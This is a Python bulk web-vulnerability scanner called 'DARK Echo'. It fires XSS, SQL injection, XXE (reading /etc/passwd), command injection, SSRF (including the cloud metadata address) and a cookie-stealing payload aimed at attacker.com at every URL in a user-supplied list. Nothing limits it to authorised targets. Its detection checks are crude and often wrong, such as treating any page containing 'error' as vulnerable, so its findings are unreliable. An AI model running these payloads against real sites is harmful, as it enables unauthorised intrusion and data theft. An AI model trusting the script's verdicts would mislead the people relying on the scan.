import requests
from pyfiglet import Figlet
from tabulate import tabulate
from colorama import Fore, Style, init

# Initialize colorama
init()

# Display banner
def display_banner():
    f = Figlet(font='slant')
    print(Fore.GREEN + f.renderText('DARK Echo') + Style.RESET_ALL)

# Check XSS vulnerability
def check_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>",
        "<a onmouseover='alert(1)'>test</a>"
    ]
    for payload in payloads:
        try:
            response = requests.get(url, params={'test': payload})
            if payload in response.text:
                return True
        except requests.RequestException:
            continue
    return False

# Check SQL Injection vulnerability
def check_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT NULL, NULL--",
        '" OR 1=1--'
    ]
    for payload in payloads:
        try:
            response = requests.get(url, params={'test': payload})
            if 'SQL' in response.text or 'error' in response.text:
                return True
        except requests.RequestException:
            continue
    return False

# Check IDOR vulnerability
def check_idor(url):
    payloads = [
        "/profile/1",
        "/profile/2",
        "/profile/999"
    ]
    for payload in payloads:
        try:
            response = requests.get(url + payload)
            if 'Profile' in response.text:  # Example condition
                return True
        except requests.RequestException:
            continue
    return False

# Check XXE vulnerability
def check_xxe(url):
    payload = """<?xml version="1.0"?>
    <!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>
    <test>&xxe;</test>
    </root>"""
    try:
        response = requests.post(url, data=payload, headers={'Content-Type': 'application/xml'})
        if 'root' in response.text:
            return True
    except requests.RequestException:
        return False
    return False

# Check Command Injection vulnerability
def check_command_injection(url):
    payloads = [
        "; ls",
        "| ls",
        "&& ls"
    ]
    for payload in payloads:
        try:
            response = requests.get(url, params={'test': payload})
            if 'bin' in response.text or 'usr' in response.text:
                return True
        except requests.RequestException:
            continue
    return False

# Check SSRF vulnerability
def check_ssrf(url):
    payloads = [
        "http://localhost:8000",
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/"
    ]
    for payload in payloads:
        try:
            response = requests.get(url, params={'test': payload})
            if 'error' in response.text or 'not found' in response.text:
                return True
        except requests.RequestException:
            continue
    return False

# Check CSRF vulnerability
def check_csrf(url):
    payload = "<img src='http://attacker.com/steal?cookie=" + str(url) + "'>"
    try:
        response = requests.get(url, params={'test': payload})
        if 'attack' in response.text:
            return True
    except requests.RequestException:
        return False
    return False

# Check for different types of vulnerabilities
def check_vulnerabilities(url):
    vulnerabilities = {
        'XSS': check_xss(url),
        'SQL Injection': check_sql_injection(url),
        'IDOR': check_idor(url),
        'XXE': check_xxe(url),
        'Command Injection': check_command_injection(url),
        'SSRF': check_ssrf(url),
        'CSRF': check_csrf(url),
    }
    return vulnerabilities

# Main function
def main():
    display_banner()
    
    # Input file with list of websites
    input_file = input("Enter the path to the file containing URLs: ")
    
    results = []
    
    try:
        with open(input_file, 'r') as file:
            urls = file.readlines()
            
            for url in urls:
                url = url.strip()
                if not url:
                    continue
                print(f"Scanning: {url}")
                vulnerabilities = check_vulnerabilities(url)
                
                row = [url]
                for vuln, found in vulnerabilities.items():
                    if found:
                        row.append(Fore.GREEN + vuln + Style.RESET_ALL)
                    else:
                        row.append(Fore.RED + vuln + Style.RESET_ALL)
                
                results.append(row)
                
    except FileNotFoundError:
        print(Fore.RED + "File not found. Please check the file path." + Style.RESET_ALL)
        return
    
    # Display results in table format
    headers = ['URL', 'XSS', 'SQL Injection', 'IDOR', 'XXE', 'Command Injection', 'SSRF', 'CSRF']
    print(tabulate(results, headers=headers, tablefmt='grid'))

if __name__ == "__main__":
    main()
